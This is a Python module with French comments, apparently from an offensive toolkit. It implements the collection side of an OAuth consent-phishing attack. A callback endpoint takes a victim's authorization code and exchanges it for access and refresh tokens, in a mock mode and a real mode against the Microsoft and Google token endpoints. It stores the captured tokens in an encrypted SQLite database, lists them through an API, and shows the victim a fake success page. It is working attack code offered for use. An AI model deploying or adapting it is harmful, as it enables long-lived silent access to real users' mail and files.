"""
attack/oauth_consent/token_exfil.py — Réception et stockage des tokens
======================================================================

Le refresh_token est l'objet le plus précieux de toute l'attaque :
- Dure 90 jours (Microsoft) / 7-30 jours (Google)
- Permet d'obtenir des access_tokens à la demande
- Donne accès aux scopes accordés (mail, files, etc.)
- Marche sans interaction utilisateur (refresh_token flow silencieux)

Ce module reçoit le code d'autorisation du mock provider, l'échange
contre un access_token + refresh_token, et stocke le tout dans un
SQLite chiffré via cryptography.Fernet.
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import secrets
import sqlite3
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Dict, Optional

import httpx
import jwt as pyjwt
from cryptography.fernet import Fernet
from fastapi import FastAPI, HTTPException, Query
from fastapi.responses import HTMLResponse, JSONResponse

logger = logging.getLogger("attack.oauth_consent.tokens")

_DB_PATH = Path("captures/oauth_tokens.db")
_KEY_PATH = Path("captures/.oauth_enc_key")

_MOCK_JWT_SECRET = "vantablack-mock-jwt-secret-key"
_MOCK_JWT_ALGO = "HS256"


# ---------------------------------------------------------------------- #
# Stockage SQLite chiffré Fernet
# ---------------------------------------------------------------------- #

def _ensure_storage() -> tuple[sqlite3.Connection, Fernet]:
    """Initialise le dossier captures, la clé Fernet, et la table SQLite."""
    _DB_PATH.parent.mkdir(parents=True, exist_ok=True)

    if _KEY_PATH.exists():
        key = _KEY_PATH.read_bytes()
    else:
        key = Fernet.generate_key()
        _KEY_PATH.write_bytes(key)
        try:
            os.chmod(_KEY_PATH, 0o600)
        except OSError:
            pass

    fernet = Fernet(key)
    conn = sqlite3.connect(str(_DB_PATH))
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS oauth_tokens (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            captured_at TEXT NOT NULL,
            blob BLOB NOT NULL
        )
        """
    )
    conn.commit()
    return conn, fernet


def _encrypt_store(token_dict: dict[str, Any]) -> None:
    """Sérialise, chiffre et insère un token dans SQLite."""
    conn, fernet = _ensure_storage()
    try:
        blob = fernet.encrypt(json.dumps(token_dict, ensure_ascii=False).encode("utf-8"))
        conn.execute(
            "INSERT INTO oauth_tokens (captured_at, blob) VALUES (?, ?)",
            (datetime.utcnow().isoformat() + "Z", blob),
        )
        conn.commit()
    finally:
        conn.close()


def _decrypt_all() -> list[dict[str, Any]]:
    """Déchiffre et retourne tous les tokens stockés."""
    conn, fernet = _ensure_storage()
    try:
        rows = conn.execute("SELECT captured_at, blob FROM oauth_tokens ORDER BY id DESC").fetchall()
        out: list[dict[str, Any]] = []
        for captured_at, blob in rows:
            try:
                obj = json.loads(fernet.decrypt(blob).decode("utf-8"))
                obj.setdefault("captured_at", captured_at)
                out.append(obj)
            except Exception as e:
                logger.warning("Token corrompu dans SQLite : %s", e)
        return out
    finally:
        conn.close()


# ---------------------------------------------------------------------- #
# CapturedToken dataclass
# ---------------------------------------------------------------------- #

@dataclass
class CapturedToken:
    """Token capturé via un consent grant."""

    app_name: str
    client_id: str
    user: str
    access_token: str
    refresh_token: str
    scope: str
    expires_at: str
    captured_at: str = field(default_factory=lambda: datetime.utcnow().isoformat() + "Z")
    tenant_id: str = "common"
    provider: str = "mock"
    metadata: dict[str, Any] = field(default_factory=dict)

    def is_expired(self) -> bool:
        return datetime.fromisoformat(self.expires_at.rstrip("Z")) < datetime.utcnow()

    def refresh_eta(self) -> int:
        if "microsoft" in self.provider or self.provider == "mock":
            return 90
        if "google" in self.provider:
            return 7
        return 30


_TOKEN_STORE: list[CapturedToken] = []


def store_token(token: CapturedToken) -> None:
    """Stocke en mémoire + persiste dans le SQLite chiffré."""
    _TOKEN_STORE.append(token)
    try:
        _encrypt_store(asdict(token))
    except Exception as e:
        logger.warning("Impossible de persister le token : %s", e)
    logger.warning(
        "[OAUTH] Token capturé : user=%s app=%s scope=%s refresh_eta=%dj",
        token.user, token.app_name, token.scope, token.refresh_eta(),
    )


def list_tokens() -> list[CapturedToken]:
    db_tokens = _decrypt_all()
    merged = list(_TOKEN_STORE)
    existing_keys = {(t.user, t.app_name, t.captured_at) for t in merged}
    for d in db_tokens:
        key = (d.get("user", ""), d.get("app_name", ""), d.get("captured_at", ""))
        if key in existing_keys:
            continue
        try:
            merged.append(CapturedToken(**d))
        except TypeError:
            pass
    return merged


def get_token(user: str, app_name: str) -> Optional[CapturedToken]:
    candidates = [t for t in list_tokens() if t.user == user and t.app_name == app_name]
    if not candidates:
        return None
    return max(candidates, key=lambda t: t.captured_at)


def clear_tokens() -> int:
    n = len(_TOKEN_STORE)
    _TOKEN_STORE.clear()
    try:
        conn, _ = _ensure_storage()
        conn.execute("DELETE FROM oauth_tokens")
        conn.commit()
        conn.close()
    except Exception:
        pass
    logger.info("[OAUTH] Cleared %d tokens (Ghost Protocol)", n)
    return n


# ---------------------------------------------------------------------- #
# Génération de faux JWT
# ---------------------------------------------------------------------- #

def _mint_fake_jwt(sub: str, scopes: str, ttl_seconds: int, extra_claims: Optional[dict] = None) -> str:
    now = int(time.time())
    payload = {
        "sub": sub,
        "scp": scopes,
        "iat": now,
        "exp": now + ttl_seconds,
        "iss": "https://login.microsoftonline.com/common/v2.0",
        "aud": "00000003-0000-0000-c000-000000000000",
        "tid": "common",
        "ver": "2.0",
    }
    if extra_claims:
        payload.update(extra_claims)
    return pyjwt.encode(payload, _MOCK_JWT_SECRET, algorithm=_MOCK_JWT_ALGO)


# ---------------------------------------------------------------------- #
# Échange code → tokens
# ---------------------------------------------------------------------- #

class TokenExfilEndpoint:
    """
    Endpoint FastAPI qui reçoit le callback OAuth (authorization code)
    et l'échange contre des access_token + refresh_token.

    Usage :
        exfil = TokenExfilEndpoint()
        exfil.exchange_code_for_tokens("mock", code, uri, cid)
    """

    def __init__(self, default_app_name: str = "Unknown App"):
        self.default_app_name = default_app_name
        self._pending_pkce: dict[str, dict[str, Any]] = {}

    def _pkce_verify(self, code: str, code_verifier: Optional[str]) -> bool:
        info = self._pending_pkce.get(code)
        if not info:
            return True
        challenge = info.get("code_challenge")
        method = info.get("code_challenge_method", "S256")
        if not challenge:
            return True
        if not code_verifier:
            return False
        if method == "plain":
            return code_verifier == challenge
        digest = hashlib.sha256(code_verifier.encode()).digest()
        derived = base64.urlsafe_b64encode(digest).decode().rstrip("=")
        return derived == challenge

    def exchange_code_for_tokens(
        self,
        provider: str,
        code: str,
        redirect_uri: str,
        client_id: str,
        user: str = "victim@entreprise.local",
        scope: Optional[str] = None,
        app_name: Optional[str] = None,
        code_verifier: Optional[str] = None,
    ) -> CapturedToken:
        """
        Échange un authorization_code contre des tokens.

        En mode mock (provider == 'mock'), génère un faux JWT HS256 avec
        access_token = 1h et refresh_token = 90j. Pour les providers
        réels, utilise httpx pour contacter leur endpoint /token.
        """
        resolved_scope = scope or "User.Read Mail.Read Files.ReadWrite.All offline_access"
        resolved_app = app_name or self.default_app_name

        if provider == "mock":
            if not self._pkce_verify(code, code_verifier):
                raise HTTPException(status_code=400, detail="Invalid PKCE code_verifier")
            access_token = _mint_fake_jwt(
                sub=user,
                scopes=resolved_scope,
                ttl_seconds=3600,
                extra_claims={"appid": client_id, "name": user},
            )
            refresh_payload = {
                "sub": user,
                "appid": client_id,
                "scp": resolved_scope,
                "iat": int(time.time()),
                "exp": int(time.time()) + 90 * 24 * 3600,
                "token_type": "refresh",
            }
            refresh_token = pyjwt.encode(refresh_payload, _MOCK_JWT_SECRET, algorithm=_MOCK_JWT_ALGO)
            expires_at = (datetime.utcnow() + timedelta(hours=1)).isoformat() + "Z"
            token = CapturedToken(
                app_name=resolved_app,
                client_id=client_id,
                user=user,
                access_token=access_token,
                refresh_token=refresh_token,
                scope=resolved_scope,
                expires_at=expires_at,
                tenant_id="common",
                provider="mock",
                metadata={
                    "authorization_code": code,
                    "redirect_uri": redirect_uri,
                    "code_len": len(code),
                },
            )
            self._pending_pkce.pop(code, None)
            store_token(token)
            return token

        token_endpoints = {
            "microsoft": "https://login.microsoftonline.com/common/oauth2/v2.0/token",
            "google": "https://oauth2.googleapis.com/token",
        }
        url = token_endpoints.get(provider)
        if not url:
            raise ValueError(f"Provider {provider!r} non supporté pour l'échange réel.")

        data = {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": redirect_uri,
            "client_id": client_id,
        }
        if code_verifier:
            data["code_verifier"] = code_verifier

        try:
            resp = httpx.post(url, data=data, timeout=20)
            resp.raise_for_status()
            payload = resp.json()
        except Exception as e:
            logger.error("Échange réel impossible : %s", e)
            raise

        expires_in = int(payload.get("expires_in", 3600))
        expires_at = (datetime.utcnow() + timedelta(seconds=expires_in)).isoformat() + "Z"
        token = CapturedToken(
            app_name=resolved_app,
            client_id=client_id,
            user=user,
            access_token=payload.get("access_token", ""),
            refresh_token=payload.get("refresh_token", ""),
            scope=payload.get("scope", resolved_scope),
            expires_at=expires_at,
            tenant_id="common",
            provider=provider,
            metadata={"redirect_uri": redirect_uri, "authorization_code": code},
        )
        store_token(token)
        return token


# ---------------------------------------------------------------------- #
# Routes FastAPI exposées
# ---------------------------------------------------------------------- #

def register_token_routes(app: FastAPI) -> TokenExfilEndpoint:
    """
    Monte les endpoints de réception OAuth sur une app FastAPI existante.

    Routes ajoutées :
        GET /oauth/callback?code=...&state=...  — réception du callback
        GET /oauth/tokens                       — liste des captures
    """
    exfil = TokenExfilEndpoint()

    @app.get("/oauth/callback")
    async def oauth_callback(
        code: str = Query(...),
        state: str = Query(""),
        provider: str = Query("mock"),
        redirect_uri: str = Query(""),
        client_id: str = Query(""),
        error: Optional[str] = Query(None),
        error_description: Optional[str] = Query(None),
    ):
        if error:
            logger.warning("[OAUTH] Callback erreur : %s (%s)", error, error_description)
            return HTMLResponse(
                f"<html><body><h2>Erreur OAuth</h2><p>{error}: {error_description}</p></body></html>",
                status_code=400,
            )
        try:
            token = exfil.exchange_code_for_tokens(
                provider=provider,
                code=code,
                redirect_uri=redirect_uri or "http://localhost:9000/oauth/callback",
                client_id=client_id or "00000000-0000-0000-0000-000000000000",
            )
        except HTTPException as he:
            raise he
        except Exception as e:
            logger.exception("Échange code → token a échoué")
            raise HTTPException(status_code=500, detail=f"Token exchange failed: {e}")

        return HTMLResponse(
            f"""<!DOCTYPE html>
<html><body style="font-family:sans-serif;text-align:center;padding:60px">
<h2>✅ Connexion réussie</h2>
<p>Vous allez être redirigé...</p>
<p style="font-size:12px;color:#999">app={token.app_name} user={token.user}</p>
<script>setTimeout(() => location.href = 'https://www.microsoft.com/', 2000);</script>
</body></html>"""
        )

    @app.get("/oauth/tokens")
    async def list_captured_tokens():
        tokens = list_tokens()
        return JSONResponse({
            "count": len(tokens),
            "tokens": [
                {
                    "app": t.app_name,
                    "user": t.user,
                    "scope": t.scope,
                    "captured_at": t.captured_at,
                    "expires_at": t.expires_at,
                    "refresh_eta_days": t.refresh_eta(),
                    "provider": t.provider,
                }
                for t in tokens
            ],
        })

    return exfil


# ---------------------------------------------------------------------- #
# Helpers (pour compatibilité avec modules existants)
# ---------------------------------------------------------------------- #

def mint_token_from_code(
    code: str,
    client_id: str,
    user: str = "victim@entreprise.local",
    scope: str = "User.Read Mail.Read Files.ReadWrite.All offline_access",
    app_name: str = "Unknown App",
) -> CapturedToken:
    exfil = TokenExfilEndpoint(default_app_name=app_name)
    return exfil.exchange_code_for_tokens(
        provider="mock",
        code=code,
        redirect_uri="http://localhost:9000/auth/callback",
        client_id=client_id,
        user=user,
        scope=scope,
        app_name=app_name,
    )
